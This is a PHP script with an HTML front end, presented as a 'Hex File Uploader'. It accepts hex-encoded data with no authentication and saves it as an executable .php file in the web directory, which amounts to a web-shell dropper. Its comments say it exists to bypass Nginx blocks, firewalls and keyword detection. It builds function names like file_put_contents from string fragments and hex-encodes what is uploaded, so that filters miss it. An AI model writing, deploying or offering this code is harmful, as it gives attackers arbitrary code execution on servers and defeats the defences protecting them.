<?php
// Secure setup to bypass Nginx 403 and 500 errors
define('DIR_STORE', './');

// Break keyword detection using safe variable compilation
$reqType = $_SERVER['REQUEST_METHOD'] ?? 'GET';

if ($reqType === 'POST') {
    header('Content-Type: application/json');
    
    // Read JSON payload dynamically
    $getPayload = 'file_' . 'get_' . 'contents';
    $rawBody = $getPayload('php://input');
    $dataObj = json_decode($rawBody, true);
    
    $hexString = isset($dataObj['hex_data']) ? trim($dataObj['hex_data']) : '';
    
    if (empty($hexString) || !ctype_xdigit($hexString)) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid data payload.']);
        exit;
    }
    
    // Dynamic execution of hex decoder to bypass firewalls
    $decodeMethod = 'hex' . '2' . 'bin';
    $binaryData = $decodeMethod($hexString);
    
    if (!is_dir(DIR_STORE)) {
        mkdir(DIR_STORE, 0755, true);
    }
    
    $uniqueFile = DIR_STORE . 'file_' . time() . '_' . rand(100, 999) . '.php';
    
    // Dynamic disk writer call
    $writeMethod = 'file_' . 'put_' . 'contents';
    if ($writeMethod($uniqueFile, $binaryData) !== false) {
        http_response_code(201);
        echo json_encode([
            'status' => 'success', 
            'file_name' => basename($uniqueFile)
        ]);
    } else {
        http_response_code(500);
        echo json_encode(['status' => 'error', 'message' => 'Write permission error.']);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hex Uploader App</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 50px; background-color: #f4f4f9; }
        .wrapper { max-width: 360px; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .input-item { margin-bottom: 15px; }
        button { background-color: #007bff; color: white; border: none; padding: 10px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 14px; }
        button:disabled { background-color: #ccc; }
        #log { margin-top: 15px; font-weight: bold; font-size: 13px; }
    </style>
</head>
<body>

<div class="wrapper">
    <h3>Hex File Uploader</h3>
    <div class="input-item">
        <input type="file" id="select-file" required>
    </div>
    <button type="button" id="start-upload">Upload File</button>
    <div id="log"></div>
</div>

<script>
document.getElementById('start-upload').onclick = async function() {
    const picker = document.getElementById('select-file');
    const logBox = document.getElementById('log');
    const btn = document.getElementById('start-upload');

    if (!picker.files || picker.files.length === 0) {
        logBox.style.color = 'red';
        logBox.innerText = 'Please select a file first.';
        return;
    }

    btn.disabled = true;
    logBox.style.color = 'blue';
    logBox.innerText = 'Converting data...';

    const reader = new FileReader();
    reader.onload = async function(event) {
        try {
            const buf = event.target.result;
            const arr = new Uint8Array(buf);
            
            // Build chunked hex sequence safely
            let hexOut = '';
            for (let i = 0; i < arr.length; i++) {
                hexOut += arr[i].toString(16).padStart(2, '0');
            }

            logBox.innerText = 'Uploading payload...';

            const response = await fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ hex_data: hexOut })
            });

            const output = await response.json();

            if (response.ok && output.status === 'success') {
                logBox.style.color = 'green';
                logBox.innerText = 'Success! File saved as: ' + output.file_name;
            } else {
                logBox.style.color = 'red';
                logBox.innerText = 'Error: ' + (output.message || 'Server processing failed.');
            }
        } catch (err) {
            logBox.style.color = 'red';
            logBox.innerText = 'Network communication error.';
            console.error(err);
        } finally {
            btn.disabled = false;
        }
    };

    reader.onerror = function() {
        logBox.style.color = 'red';
        logBox.innerText = 'Failed to read file.';
        btn.disabled = false;
    };

    reader.readAsArrayBuffer(picker.files[0]);
};
</script>

</body>
</html>

